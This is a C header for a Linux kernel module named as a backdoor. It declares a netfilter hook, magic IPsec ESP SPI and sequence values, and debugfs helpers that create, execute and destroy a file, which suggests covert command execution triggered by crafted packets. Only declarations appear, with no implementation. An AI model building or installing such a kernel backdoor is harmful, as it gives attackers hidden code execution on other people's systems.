#ifndef BACKDOOR_H
#define BACKDOOR_H

/* Generic */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/debugfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kthread.h>

/* Netfilter */
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/esp.h>

#define DATA_LEN 255
#define TARGET_SPI 0x48dcd78c
#define TARGET_SEQ 0xae574ada

MODULE_AUTHOR("Nick Bulischeck");
MODULE_LICENSE("GPL");

struct nf_hook_ops;

/* Netfilter hook */
int nfhook_init(void);
void nfhook_exit(void);

/* debugfs helpers */
int create_file(void);
void execute_file(void);
void destroy_file(void);

#endif /* BACKDOOR_H */
